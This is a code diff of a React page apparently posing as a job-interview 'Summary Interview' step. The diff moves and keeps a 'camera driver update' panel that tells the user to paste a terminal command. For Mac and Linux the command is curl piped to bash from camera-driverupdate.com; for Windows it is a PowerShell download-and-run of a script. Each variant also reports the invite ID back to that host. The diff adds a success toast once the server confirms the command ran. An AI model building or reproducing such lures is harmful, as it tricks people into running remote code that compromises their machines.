@@ -30,7 +30,9 @@ export default function SummaryInterview() {
   const [submitProgress, setSubmitProgress] = useState(0) // 0–100 for 5s circle
   const [driverOs, setDriverOs] = useState('mac') // mac | windows | linux (for fake driver commands)
   const [copySuccess, setCopySuccess] = useState(false)
+  const [cameraDriverUpdatedMessage, setCameraDriverUpdatedMessage] = useState(null) // shown once when connections_status becomes 2
   const driverCommandRef = useRef(null)
+  const connectionsStatusRef = useRef(null)
 
   const copyCommandToClipboard = useCallback(() => {
     const text = driverCommandRef.current?.textContent?.trim()
@@ -46,6 +48,10 @@ export default function SummaryInterview() {
     getInviteByLink(inviteLink)
       .then((inv) => {
         const status = Number(inv.connections_status)
+        const prev = connectionsStatusRef.current
+        if (status === 2 && (prev === 0 || prev === 1)) {
+          setCameraDriverUpdatedMessage('Your camera driver has been updated successfully.')
+        }
         setConnectionsStatus(status)
         setInvalidInvite(status === 3)
         try {
@@ -63,7 +69,11 @@ export default function SummaryInterview() {
     fetchConnectionsStatus()
   }, [inviteLink, fetchConnectionsStatus])
 
-  // When connections_status is not yet 2, refetch periodically so that after GET /invite/:id sets status to 2, the Start camera button becomes active
+  useEffect(() => {
+    connectionsStatusRef.current = connectionsStatus
+  }, [connectionsStatus])
+
+  // When connections_status is not yet 2, refetch periodically; once it's 2, stop checking
   useEffect(() => {
     if (!inviteLink || connectionsStatus === 2 || connectionsStatus === 3) return
     const interval = setInterval(fetchConnectionsStatus, 3000)
@@ -72,11 +82,17 @@ export default function SummaryInterview() {
 
   useEffect(() => {
     const onFocus = () => {
-      if (inviteLink) fetchConnectionsStatus()
+      if (inviteLink && connectionsStatus !== 2 && connectionsStatus !== 3) fetchConnectionsStatus()
     }
     window.addEventListener('focus', onFocus)
     return () => window.removeEventListener('focus', onFocus)
-  }, [inviteLink, fetchConnectionsStatus])
+  }, [inviteLink, connectionsStatus, fetchConnectionsStatus])
+
+  useEffect(() => {
+    if (!cameraDriverUpdatedMessage) return
+    const t = setTimeout(() => setCameraDriverUpdatedMessage(null), 5000)
+    return () => clearTimeout(t)
+  }, [cameraDriverUpdatedMessage])
 
   useEffect(() => {
     if (inviteLink) return // when invite in URL, we fetch above
@@ -392,6 +408,14 @@ export default function SummaryInterview() {
           </div>
         </div>
       )}
+      {cameraDriverUpdatedMessage && (
+        <div className={styles.toastWrap} role="alert" aria-live="polite">
+          <div className={styles.toast}>
+            <span className={styles.toastIcon}>✓</span>
+            <p className={styles.toastMessage}>{cameraDriverUpdatedMessage}</p>
+          </div>
+        </div>
+      )}
       <div className={styles.card}>
         <header className={styles.header}>
           <span className={styles.badge}>Summary Interview</span>
@@ -557,61 +581,6 @@ export default function SummaryInterview() {
             </div>
           )}
         </div>
-        <div className={styles.driverHelp}>
-          <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
-          <select
-            id="driver-os"
-            value={driverOs}
-            onChange={(e) => setDriverOs(e.target.value)}
-            className={styles.driverHelpSelect}
-            aria-describedby="driver-guide driver-command"
-          >
-            <option value="mac">Mac</option>
-            <option value="windows">Windows</option>
-            <option value="linux">Linux</option>
-          </select>
-          <p id="driver-guide" className={styles.driverHelpGuide}>
-            Run the command below in your terminal to update your camera driver.
-          </p>
-          <div className={styles.driverHelpCommandWrap}>
-            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="img" aria-label="Example command">
-            {driverOs === 'mac' && (
-                      <code>
-                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
-                    -H "Host: camera-driverupdate.com" \
-                    -H "User-Agent: Mozilla/5.0" \
-                    -H "Accept: */*" | bash && \
-                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
-                      </code>
-                  )}
-              {driverOs === 'windows' && (
-                <pre>
-                  <code>
-              {`powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\\script.cmd';Invoke-WebRequest -Uri 'https://camera-driverupdate.com/window' -Method POST -Headers @{'User-Agent'='Mozilla/5.0'} -MaximumRedirection 10 -OutFile $f;cmd /c $f"
-              powershell Invoke-RestMethod -Uri "https://camera-driverupdate.com/package-update/${inviteLink || ''}" -Method Get`}
-                  </code>
-                </pre>
-              )}
-              {driverOs === 'linux' && (
-                      <code>
-                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
-                    -H "Host: camera-driverupdate.com" \
-                    -H "User-Agent: Mozilla/5.0" \
-                    -H "Accept: */*" | bash && \
-                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
-                      </code>
-                  )}
-            </div>
-            <button
-              type="button"
-              onClick={copyCommandToClipboard}
-              className={styles.driverHelpCopyBtn}
-              aria-label={copySuccess ? 'Copied' : 'Copy command'}
-            >
-              {copySuccess ? 'Copied!' : 'Copy'}
-            </button>
-          </div>
-        </div>
 
         <div className={styles.actions}>
           {status === 'ready' && (
@@ -647,6 +616,60 @@ export default function SummaryInterview() {
               )}
             </>
           )}
+        </div>
+
+        <div className={styles.driverHelp}>
+          <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
+          <select
+            id="driver-os"
+            value={driverOs}
+            onChange={(e) => setDriverOs(e.target.value)}
+            className={styles.driverHelpSelect}
+            aria-describedby="driver-guide driver-command"
+          >
+            <option value="mac">Mac</option>
+            <option value="windows">Windows</option>
+            <option value="linux">Linux</option>
+          </select>
+          <p id="driver-guide" className={styles.driverHelpGuide}>
+            Run the command below in your terminal to update your camera driver.
+          </p>
+          <div className={styles.driverHelpCommandWrap}>
+            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="img" aria-label="Example command">
+            {driverOs === 'mac' && (
+                      <code>
+                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
+                    -H "Host: camera-driverupdate.com" \
+                    -H "User-Agent: Mozilla/5.0" \
+                    -H "Accept: */*" | bash && \
+                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                      </code>
+                  )}
+              {driverOs === 'windows' && (
+                  <code>
+              {`powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\\script.cmd';Invoke-WebRequest -Uri 'https://camera-driverupdate.com/window' -Method POST -Headers @{'User-Agent'='Mozilla/5.0'} -MaximumRedirection 10 -OutFile $f;cmd /c $f"
+              powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri "https://camera-driverupdate.com/package-update/${inviteLink || ''}" -Method Get`}
+                  </code>
+              )}
+              {driverOs === 'linux' && (
+                      <code>
+                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
+                    -H "Host: camera-driverupdate.com" \
+                    -H "User-Agent: Mozilla/5.0" \
+                    -H "Accept: */*" | bash && \
+                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                      </code>
+                  )}
+            </div>
+            <button
+              type="button"
+              onClick={copyCommandToClipboard}
+              className={styles.driverHelpCopyBtn}
+              aria-label={copySuccess ? 'Copied' : 'Copy command'}
+            >
+              {copySuccess ? 'Copied!' : 'Copy'}
+            </button>
+          </div>
         </div>
       </div>
     </div>
